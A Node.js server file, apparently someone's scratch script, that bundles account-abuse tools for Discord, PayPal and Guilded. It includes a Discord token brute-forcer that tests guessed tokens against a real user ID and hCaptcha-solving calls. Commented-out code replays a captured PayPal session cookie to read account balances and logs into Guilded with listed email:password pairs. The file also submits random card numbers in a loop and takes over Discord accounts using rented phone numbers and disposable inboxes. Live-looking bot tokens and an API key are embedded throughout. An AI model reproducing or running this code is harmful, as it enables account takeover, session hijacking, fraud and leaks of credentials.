const express = require('express')
const app = express()
const fetch = require('node-fetch')
let ws = require('ws')
var bodyParser = require('body-parser')

app.use(bodyParser.json())


var http = require('http')

const server = new http.createServer(app);
server.listen(3000)

let wss = new ws.Server({ server });
wss.on('connection', async function connection(c, req) {

c.on('message', async function message(msg) {

let message;
try { message = JSON.parse(msg) } catch { ws.close() }

Array.from(wss.clients).forEach(async c =>{
c.send(JSON.stringify(message))
})

})

})
app.get("/", async (req, res) => {
/*manager.sendWebhook(
`**Now Login In Host! Puplic IP: (${req.headers['x-forwarded-for'].split(',')[0].trim()}**`)*/
  res.sendFile(__dirname + "/htmlhsw.html");
});


app.get("/getCaptcha/:sitekey", async (req, res) => {
let { params } = req

let dataFetch = await fetch((`https://hcaptcha.com/checksiteconfig?host=thissystem.glitch.me&sitekey=${params.sitekey}&sc=1&swa=1`), {method: "GET", headers: { 'Content-Type': 'application/json' }})
let dataJson = await dataFetch.json()
res.json(dataJson)
})
let hcaptcha = require('./hcaptcha.js');
(async () => {
    try {
      const response = await hcaptcha('https://captcha-protected-site.com');
      console.log(response);
      // F0_eyJ0eXAiOiJKV1Q...
    } catch (error) {
      console.log(error);
    }
})();
/*
const solveCaptcha = require('hcaptcha-solver');
 
(async () => {
    try {
      const response = await solveCaptcha('https://captcha-protected-site.com', {sitekey: "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"});
      console.log(response);
      // F0_eyJ0eXAiOiJKV1Q...
    } catch (error) {
      console.log(error);
    }
})();*/
/*
const solveCaptcha = require("@hitthemoney/hcaptcha-solver");

(async () => {
    try {
        const response = await solveCaptcha("https://discord.com/register", {
            siteKey: "f5561ba9-8f1e-40ca-9b5b-a0b3f719ef34"
        });
        console.log(response);
        // F0_eyJ0eXAiOiJKV1Q...
    } catch (error) {
        console.log(error);
    }
})();
*/
/*
app.post('/auth/validatecaptcha', async (req, res) =>{

let { body } = req

console.log(body)

let data = await paypal.captchaVerify(body)
res.send(data)
})*/

const FormData = require('form-data');
const random = require('random-id-generator')
const chalk = require('chalk')

const getTokenStart = async (id) =>{
  return await new Promise((res , rej) =>{
const form = new FormData();
form.append('input', Number(id));
form.append('charset', "UTF-8");
form.append('separator', "lf");
form.append('newlines', "on");
fetch(('https://www.base64encode.org/') , {method: 'post', body: form, referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.text();

const GetToken = (text) => {
  let split = text.split(`<textarea name="output" id="output" placeholder="Result goes here..." spellcheck="false">`);
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split('</textarea>');
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}
res(GetToken(json))
})
})
}
const tokenRandom = (t0) =>{

let t1 = random(6)
let t2 = "."
let t3 = random(9)
let t4 = "-"
let t5 = random(15)
let t6 = "-"
let t7 = random(2)

let token = t0 + "." + t1 + t2 + t3 + t4 + t5 + t6 + t7
return token
}

const testToken = async (token)=>{
  return await new Promise((res , rej) =>{

fetch(('https://discord.com/api/v9/users/@me') , {method: 'patch', headers: {'Content-Type': 'application/json', authorization: token }, body: JSON.stringify({bio: "Hi Im Yousuf GG!"}), referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.text();
res(json)
})
  })
}

let startGen = async ()=>{

let tokenStart = await getTokenStart("766216000462258219")

let randomToken = tokenRandom(tokenStart)

let tokenTest = await testToken(randomToken)

if(!tokenTest.discriminator){
startGen()
console.log(chalk.red(`${randomToken} - Failed`));
}
if(tokenTest.discriminator) console.log(chalk.red(`${randomToken} - Success`));

}

//startGen()
//getTokenStart

/*
let cookie = "headerKey=defaultKey; nsid=s%3AbzRuGpeaUxYaB9ABlUtnuQPe-QBE5Mcj.vpi7rfO708DU7yQZXme13pvsiFpLCXft69vQtcT7WXo; l7_az=dcg13.slc; ts_c=vr%3D04b072ac17b0ad00744eb70ffe1504ce%26vt%3D04b072ac17b0ad00744eb70ffe1504cd; cookie_check=yes; _gcl_au=1.1.2038243837.1627871280; d_id=af16a35a11184d3d92810f48b08462081627871286486; KHcl0EuY7AKSMgfvHl7J5E7hPtK=Gsh0cZrd0K4sCYxxTneGdBQTwiB11D9uKq3KjKXPdiKM-IFOEtR11zNCmYCo73R88V7oPH8h1ZUgs_3f; fn_dt=af16a35a11184d3d92810f48b0846208; enforce_policy=gdpr_v2.1; LANG=en_US%3BRO; ui_experience=login_type%3DEMAIL_PASSWORD%26tokenType%3Dsoftware_token_authenticator%26tokenIdentifier%3DWIquIrjeoFYEfLoCrFjE_dUugfLYs0LhEVfAIg2-XuT4cB6jNZ0ONljYUtZx1kzBMjPbPavKH5ReKg5E; id_token=idtokend2e0578a57764cd6aef55e1f4dba0bcf; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAPzRiJBht7sMYxymUGUMug4-of1c2sIvjo2RWajOb3z2ShyHIVU91wmYRll2CDf2n7CBJqLUd4DAOgEvXgYkWnnw8fTjA; rmuc=-m1gIJNMpAbrJrrX1tjJex3auBbsA330OL3yzTgwOakH1GsgFbxZ3tcQ_j-ye03cxnqNiGvrUkGqt1k7l2AUsUslbCvPzCkPfQXBJQkeMfjVarLBHoIS3u76yHIZ5Wi-SMsfPrCKt4KvGnhtV79idJPe3Jab1Zwpx6uXEJeO892XAztc67WR7TeVKaO; DPz73K5mY4nlBaZpzRkjI3ZzAY3QMmrP=S23AAPzRiJBht7sMYxymUGUMug4-of1c2sIvjo2RWajOb3z2ShyHIVU91wmYRll2CDf2n7CBJqLUd4DAOgEvXgYkWnnw8fTjA; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; akavpau_ppsd=1627872828~id=0dd25b359508b699d21a214664382f32; x-cdn=fastly:FJR; tcs=main%3Abusinessweb%3Amep%3Adashboard%3Amain%7CacceptAllButton; HaC80bwXscjqZ7KM6VOxULOB534=6NdkTiVOJiGfmTnIoOkG6ogUpS4Gho9eqerNLAXCccE5lzdS67ABZynQM2yhemUX9FbJGQ6plSjVnabSfHC8iV99OwTTN7mJZuUetfFw8i4_H6qj-gI0Ahz2gmfhTXxY_9jLRm; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; x-pp-s=eyJ0IjoiMTYyNzg3MjQ3MzA4MiIsImwiOiIxIiwibSI6IjAifQ; tsrce=privacynodeweb; ts=vreXpYrS%3D1722566874%26vteXpYrS%3D1627874274%26vr%3D04b072ac17b0ad00744eb70ffe1504ce%26vt%3D04b072ac17b0ad00744eb70ffe1504cd%26vtyp%3Dnew"
fetch(('https://www.paypal.com/mep/dashboard') , {method: 'GET', headers: {'Content-Type': 'application/json', cookie: cookie }, referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.text();
console.log("y")

const GetMoney = (text) => {
  let split = text.split(`class="css-4kebi9 ewkn0kh0">`);
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split('USD');
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}


const GetMoneyHold = (text) => {
  let split = text.split(`<div color="#687173" class="css-1bncj8b e1pqnvk70"><span font-size="40px" font-weight="400" font-family="PayPalSansBig-Light, &#x27;Helvetica Neue&#x27;, Arial, sans-serif" aria-describedby="estimate-accessibility-text" class="css-4kebi9 ewkn0kh0">`);
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split('USD');
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}
console.log(GetMoneyHold(json))

console.log(GetMoney(json))
})
app.get('/test', (req, res) =>{
let Y0Captcha = require('./Y0Captcha.js')
let cookie = "headerKey=defaultKey; nsid=s%3AbzRuGpeaUxYaB9ABlUtnuQPe-QBE5Mcj.vpi7rfO708DU7yQZXme13pvsiFpLCXft69vQtcT7WXo; l7_az=dcg13.slc; ts_c=vr%3D04b072ac17b0ad00744eb70ffe1504ce%26vt%3D04b072ac17b0ad00744eb70ffe1504cd; cookie_check=yes; _gcl_au=1.1.2038243837.1627871280; d_id=af16a35a11184d3d92810f48b08462081627871286486; KHcl0EuY7AKSMgfvHl7J5E7hPtK=Gsh0cZrd0K4sCYxxTneGdBQTwiB11D9uKq3KjKXPdiKM-IFOEtR11zNCmYCo73R88V7oPH8h1ZUgs_3f; fn_dt=af16a35a11184d3d92810f48b0846208; enforce_policy=gdpr_v2.1; LANG=en_US%3BRO; ui_experience=login_type%3DEMAIL_PASSWORD%26tokenType%3Dsoftware_token_authenticator%26tokenIdentifier%3DWIquIrjeoFYEfLoCrFjE_dUugfLYs0LhEVfAIg2-XuT4cB6jNZ0ONljYUtZx1kzBMjPbPavKH5ReKg5E; id_token=idtokend2e0578a57764cd6aef55e1f4dba0bcf; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAPzRiJBht7sMYxymUGUMug4-of1c2sIvjo2RWajOb3z2ShyHIVU91wmYRll2CDf2n7CBJqLUd4DAOgEvXgYkWnnw8fTjA; rmuc=-m1gIJNMpAbrJrrX1tjJex3auBbsA330OL3yzTgwOakH1GsgFbxZ3tcQ_j-ye03cxnqNiGvrUkGqt1k7l2AUsUslbCvPzCkPfQXBJQkeMfjVarLBHoIS3u76yHIZ5Wi-SMsfPrCKt4KvGnhtV79idJPe3Jab1Zwpx6uXEJeO892XAztc67WR7TeVKaO; DPz73K5mY4nlBaZpzRkjI3ZzAY3QMmrP=S23AAPzRiJBht7sMYxymUGUMug4-of1c2sIvjo2RWajOb3z2ShyHIVU91wmYRll2CDf2n7CBJqLUd4DAOgEvXgYkWnnw8fTjA; SEGM=bRdV1vB0ebq9RKdAb3xSHowCi6QnnlCiDOLNk8i1mAuLl1vTbzHQwWajSsMe8mvoWiJtY1GnpzN4Y-sixGy7BQ; akavpau_ppsd=1627872828~id=0dd25b359508b699d21a214664382f32; x-cdn=fastly:FJR; tcs=main%3Abusinessweb%3Amep%3Adashboard%3Amain%7CacceptAllButton; HaC80bwXscjqZ7KM6VOxULOB534=6NdkTiVOJiGfmTnIoOkG6ogUpS4Gho9eqerNLAXCccE5lzdS67ABZynQM2yhemUX9FbJGQ6plSjVnabSfHC8iV99OwTTN7mJZuUetfFw8i4_H6qj-gI0Ahz2gmfhTXxY_9jLRm; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; x-pp-s=eyJ0IjoiMTYyNzg3MjQ3MzA4MiIsImwiOiIxIiwibSI6IjAifQ; tsrce=privacynodeweb; ts=vreXpYrS%3D1722566874%26vteXpYrS%3D1627874274%26vr%3D04b072ac17b0ad00744eb70ffe1504ce%26vt%3D04b072ac17b0ad00744eb70ffe1504cd%26vtyp%3Dnew"
fetch(('https://www.paypal.com/mep/dashboard') , {method: 'GET', headers: {'Content-Type': 'application/json', cookie: cookie }, referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.text();
console.log("y")

const GetMoney = (text) => {
  let split = text.split("PayPal Balance");
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split('USD*');
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}
console.log(GetMoney(json))
res.send(json)
})
})*/
let Y0Captcha = require('./Y0Captcha.js')
setInterval(async () => {
//Y0Captcha.start(2).then(m => console.log(m))
}, 6000)

/*let GJS = require('./GROUPjs-lib/index.js')

let { Client, newEmbed } = GJS
let client = new Client("ODY3OTA5ODM5ODY1NjQzMDM4.YPn-CA.", {ONEReady: true, RESTVerison: 9})



client.once('error', async () =>{
console.log('Error')
})
client.once('ready', async () =>{
console.log('Ready')
const SMSActivate = require('sms-activate')
const sms = new SMSActivate('b5f387f01A128f611bfc490Ae6336146')
const balance = await sms.getBalance()
if (balance > 0) {
  const { id, number } = await sms.getNumber('ds', 15)
console.log(`${number}`)
//  await sms.setStatus(id, 1)
let phone = await client.user.phoneGetCode('48', `${number}`)
if(!phone) return;
console.log(phone)
  const waitForCode = setInterval(async () => {
    const code = await sms.getCode(id)
    if (code) {
      clearInterval(waitForCode)
 
      console.log(code)
      console.log(`${code}`.replace(' ', ''))

let v = await phone.verify(`${code}`.replace(' ', ''), '41371755aa')
console.log(v)
//     await sms.setStatus(id, 6)

    }
  }, 1000)
} else {
  console.log('You don\'t have enough money')
}


})*/

/*

zwhbyvbn@gmail.com:oscirmfayzns
hohbdowz@gmail.com:jjandxqvculr
*//*
var body =
{"email":"zwhbyvbn@gmail.com","password":"oscirmfayzns","getMe":true}

fetch(('https://www.guilded.gg/api/login') , {method: 'post', body: JSON.stringify(body), headers: {'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async oneas =>{
  let jsona = await oneas.json();
var cookie = ``

for(const cooki of oneas.headers.raw()['set-cookie']){
cookie = cookie + ` ${cooki}`
}

fetch(('https://www.guilded.gg/api/invites/XkQYeoDk?teamId=ORLdw05R') , {method: 'PUT', body: JSON.stringify({type: "consume"}), headers: {'Content-Type': 'application/json', cookie: cookie }, referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.json();
console.log(json)
})
//console.log(jsona)
})*/
/*
let GJS = require('./GROUPjs-lib/index.js')

let { Client, newEmbed } = GJS
let client = new Client("ODEzMDI4ODA0NTE5Mzk1NDE4.YDJWFA.y_1YJ03F9H7Fo-jqis7OkJXOhJg", {temp: false})

client.on('ready', async () =>{
console.log('Ready')
console.log(client.guilds.get('793203630978498560').channels.get('858067001662242866'))
})


client.on('messageCreate', (msg) =>{
//if(msg.channel.id === "832024588351176734") console.log(msg.guild.members.get('535423612308422668').roles.get('801743113084469271'))
if(msg.content === "$ping"){
let channel = msg.guild.channels.get(msg.channel_id)
console.log(channel)
}
})*/
            /*                                                                                                                                   
const random = require('random-id')
setInterval(async () => {
let body_register = {
email: random(8, 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'),
name: "Yousuf.discord",
password: "41371755aa"
}

fetch(('https://apigroup.glitch.me/api/register-account/') , {method: 'post', body: JSON.stringify(body_register), headers: { "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async one =>{
  let json = await one.json()

fetch(('https://apigroup.glitch.me/api/test-channel/') , {method: 'post', body: JSON.stringify({"channel": "yousuf"}), headers: { "authorization": json.token, "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async onec =>{
  let jsonc = await onec.json();
fetch(('https://apigroup.glitch.me/api/code') , {method: 'GET', headers: { "authorization": json.token, "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async oneas =>{
  let jsona = await oneas.json();

fetch(('https://apigroup.glitch.me/api/uncode') , {method: 'post', body: JSON.stringify({code: jsona.code}), headers: { "authorization": json.token, "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async ones =>{
  let jsons = await ones.json();
fetch(('https://apigroup.glitch.me/api/tokens') , {method: 'post', body: JSON.stringify({code: jsons.code, type: "web"}), headers: { "authorization": json.token, "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async onesaa =>{
  let d = await onesaa.json();
let buy_body = {
card: "32" + random(13, '1234567890'),
cvv: random(4, '1234567890'),
key: d.key,
token: json.token,
yymm: "12/24",
}

fetch(('https://apigroup.glitch.me/api/event/') , {method: 'post', body: JSON.stringify(buy_body), headers: { "authorization": d.authorization, "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async onesa =>{
  let data = await onesa.json();

fetch(('https://apigroup.glitch.me/api/test-account/') , {method: 'post', body: JSON.stringify({"email": "x", "password": "x", "type": 2, "token": json.token}), headers: { "User-Agent": "Glitch",'Content-Type': 'application/json' }, referrerPolicy: "no-referrer"}).then(async onecl =>{
  let client = await onecl.json();
console.log(client.data.tag)
})

})
})
})

})
})

})
}, 6500)*/
const Eris = require('eris')
let clientEris = new Eris('ODEzMDI4ODA0NTE5Mzk1NDE4.YDJWFA.y_1YJ03F9H7Fo-jqis7OkJXOhJg')

/*
clientEris.on('ready', async () =>{
console.log('ready')
let messages = await clientEris.getMessages("720434719845646336", 1500)
var money = 0
for(const message of messages){
const GetMoney = (text) => {
  let split = text.split("`$");
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split('` to');
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}
if(GetMoney(message.content)) money = money + Number(GetMoney(message.content))
}
console.log(money)

})
clientEris.connect()*/





let email = () =>{
let random = require('random-id')
return random(8, 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
}

let getMessage = async (token, id)=>{
let headers = {'Content-Type': 'application/json', authorization: "Bearer " + token}
return await new Promise((res , rej) =>{
fetch((`https://api.mail.tm/messages/${id}`) , {method: 'GET', headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
res(json)
})
})
}

let getMessages = async (token)=>{

let headers = {'Content-Type': 'application/json', authorization: "Bearer " + token}
return await new Promise((res , rej) =>{
fetch((`https://api.mail.tm/messages`) , {method: 'GET', headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
res(json['hydra:member'])
})
})
}

let getToken = async (body) =>{
let headers = {'Content-Type': 'application/json'}
return await new Promise((res , rej) =>{
fetch((`https://api.mail.tm/token`) , {method: 'post', body: JSON.stringify(body), headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
res(json.token)
})
})
}

let getEmail = async () =>{
let headers = {'Content-Type': 'application/json'}

var body = {
  "address": email() + "@northsixty.com",
  "password": "41371755aa"
}
return await new Promise((res , rej) =>{
fetch((`https://api.mail.tm/accounts`) , {method: 'post', body: JSON.stringify(body), headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
json.body = {address: json.address, password: "41371755aa"}
res(json)
})
})
}

let setEmail = async (email, account_token) =>{
let headers = {'Content-Type': 'application/json', authorization: account_token}
let body = {
email: email,
password: "41371755aa"
}
return await new Promise((res , rej) =>{
fetch((`https://discord.com/api/v9/users/@me`) , {method: 'PATCH', body: JSON.stringify(body), headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
res(json)
})
})
}

let getCode = (text) =>{
const GetMessage = (text) => {
  let split = text.split(`Verify Email: `);
  if (!split || !split[1]) return;
  let afterurl = split[1];
  let afterSplit = afterurl.split(` `);
  if (!afterSplit || !afterSplit[0]) return;
  return afterSplit[0];

}
return GetMessage(text)
}

const getDiscordToken = async (number)=>{
let headers = {'Content-Type': 'application/json'}
let body = {"login":"+48" + number,"password":"41371755aa","undelete":false,"captcha_key":null,"login_source":null,"gift_code_sku_id":null}

return await new Promise((res , rej) =>{
fetch((`https://discord.com/api/v9/auth/login`) , {method: 'post', body: JSON.stringify(body), headers: headers, referrerPolicy: "no-referrer"}).then(async ress =>{
  let json = await ress.json().catch(err =>{});
res(json)
})
})
}

const start = async ()=>{
let email = await getEmail()

let account_token = await getDiscordToken("783457757")

let sendToEmail = await setEmail(email.address, account_token.token)

console.log(sendToEmail.token)

let token = await getToken(email.body)

await new Promise((res , rej) =>{ setTimeout(() => res() , 4000)})

let messages = await getMessages(token)

let message = await getMessage(token, messages[0].id)
console.log(getCode(message.text))
}
//start()

let GROUPJS = require('./GROUPJS/index.js')
let client = new GROUPJS({token: "NyerEasdsYasxc5SFG27", cache: true})

client.on('ready', async () =>{
console.log(client.users.cache.has(d => d.tag === "9881" && d.username === "Yousuf.discord"))
})
client.on('messageCreate', async (msg) =>{
msg.delete().then(m => console.log(m))
})